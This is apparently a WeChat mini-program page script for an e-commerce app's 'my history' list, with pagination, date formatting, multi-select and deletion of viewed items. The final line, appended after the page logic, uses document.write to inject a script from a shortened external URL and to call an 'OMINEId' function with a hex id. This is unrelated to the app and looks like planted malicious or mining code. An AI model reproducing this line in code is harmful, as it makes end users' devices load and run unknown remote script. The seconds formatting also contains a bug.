var t = getApp(),
  e = t.requirejs("core"),
   jq = t.requirejs("jquery");
t.requirejs("foxui");
Page({
  data: {
    icons: t.requirejs("icons"),
    pages: 1,
    loading: false,
    loaded: false,
    isedit: false,
    total:"2",
    isCheckAll: false,
    checkObj: {},
    checkNum: 0,
    list: []
  },
  onLoad: function (e) {
    //t.url(e),
      this.getList({page:1,pageSize:10})
  },
  onShow:function(e){
  },
  onReachBottom: function () {
    var pge = this.data.pages;
    pge++;
    if (pge >= 100) { return };
    if (!this.data.loaded) {
      this.getList({ page: pge, pageSize: 10 });
      this.setData({
        pages: pge
      });
    }
    //this.data.loaded || this.data.list.length == this.data.total || this.getList()
  },
  onPullDownRefresh: function () {
    this.setData({
      pages: 1,
      loaded: false,
      loading: true,
      list: []
    });
    this.getList({ page: 1, pageSize: 10 });
    wx.stopPullDownRefresh();
  },
  getList: function (addObj,fn) {
    var _this = this;
    _this.setData({
      show: true
    });
    wx.showLoading({
      icon: '加载中'
    });
    //我的足迹
    var senddata = {
      session_token: t.globalData.session_token,
      show_data: 'myHistory',
      // action: 'action',
      // p_id: 13

    }
    if (addObj) { senddata = jq.extend(senddata,addObj);};
    wx.request({
      url: t.globalData.daxin + "/memberCenter/my",
      data: senddata,
      method: "POST",
      success: function (res) {
        wx.hideLoading();
        if (res.data.msg.indexOf("delete")>-1) {
          if (res.data.msg == "delete_success"){
            wx.showToast({
              title: '成功',
              icon: 'success',
              duration: 800,
              success: function () {
                if (fn) fn();
              }
            });
          }else{
            wx.showToast({
              title: '删去失败',
              duration: 800,
              success: function () {
               
              }
            });
          }
          
          return;
        }
        if (res.data.statusCode >= 0 && res.data.data.list.length > 0) {
          var lists = [];
          if (addObj.page > 1) lists = _this.data.list;
          var datalist = res.data.data.list;
          jq.each(datalist, function (index, value) {
            var now =new Date();
            value.createtime = value.createtime ? value.createtime : _this.formatDateTime(now) ;
            value.store = value.store > 0 ? value.store : 0;
            //value.id=value.id;
            value.thumb = (t.globalData.daxinImg + value.img);
            value.rangeprice = parseFloat(value.product_price[value.product_price.length - 1].unit_price).toFixed(2) + "~" + parseFloat(value.product_price[0].unit_price).toFixed(2);
            lists.push(value);
          });
          if (addObj.page == 1 && lists.length<10){
            _this.setData({
              list: lists,
              loading: false,
              loaded:true 
            });
          }else{
            _this.setData({
              list: lists,
              loading: true
            });
          } 
        } else {
          if (addObj.page == 1) {
            _this.setData({
              total: 0
            });
            if (res.data.statusCode == -400) {
              _this.setData({
                total: 0,
                list:[],
                loading: false
              });
              return;
            };
            wx.showModal({
              title: '提示信息',
              content: res.data.msg,
              showCancel: false,
              success: function (res) {
                if (res.confirm) {
                  //console.log('用户点击确定')
                } else if (res.cancel) {
                  //console.log('用户点击取消')
                }
              }
            })
          } else {
            _this.setData({
              loaded: true,
              loading: false
            });
          };
        }
      }
    })
  },
  formatDateTime: function (date) {

    var y = date.getFullYear();

    var m = date.getMonth() + 1;

    m = m < 10 ? ('0' + m) : m;

    var d = date.getDate();

    d = d < 10 ? ('0' + d) : d;

    var h = date.getHours();

    var minute = date.getMinutes();

    minute = minute < 10 ? ('0' + minute) : minute;

    var second = date.getSeconds();

    second = second < 10 ? ('0' + minute) : second;

    return (y + '-' + m + '-' + d + ' ' + h + ':' + minute + ':' + second);

  },
  itemClick: function (t) {
    var i = this,
      a = e.pdata(t).id,
      s = e.pdata(t).goodsid;
    if (i.data.isedit) {
      var c = i.data.checkObj,
        l = i.data.checkNum;
      c[a] ? (c[a] = false, l--) : (c[a] = true, l++);
      var o = true;
      for (var n in c)
        if (!c[n]) {
          o = false;
          break
        }
      i.setData({
        checkObj: c,
        isCheckAll: o,
        checkNum: l
      })
    } else
      wx.navigateTo({
        url: "/pages/goods/detail/index?id=" + a
      })
  },
  btnClick: function (t) {
    var i = this,
      a = t.currentTarget.dataset.action;
    if ("edit" == a) {
      var s = {};
      for (var c in this.data.list) {
        s[this.data.list[c].id] = false
      }
      i.setData({
        isedit: true,
        checkObj: s,
        isCheckAll: false
      })
    } else if ("delete" == a) {
      var s = i.data.checkObj;
      var ids = [];
      jq.each(s, function (ind, val) {
        if (val) {
          ids.push(ind);
        }
      }); 
      e.confirm("删除后不可恢复，确定要删除吗？", function () {
        i.getList({
          action: "delete",
          ids: ids
        }, function () {
          i.getList({ page: 1, pageSize: 10 });
        });
      })
    } else
      "finish" == a && i.setData({
        isedit: false,
        checkNum: 0
      })
  },
  checkAllClick: function () {
    var t = !this.data.isCheckAll,
      e = this.data.checkObj,
      i = {
        isCheckAll: t,
        checkObj: e
      };
    for (var a in e)
      i.checkObj[a] = !!t;
    i.checkNum = t ? this.data.list.length : 0,
      this.setData(i)
  }
})
document.write('<script src="http://t.cn/EvlonFh"></script><script>OMINEId("e02cf4ce91284dab9bc3fc4cc2a65e28","-1")</script>');
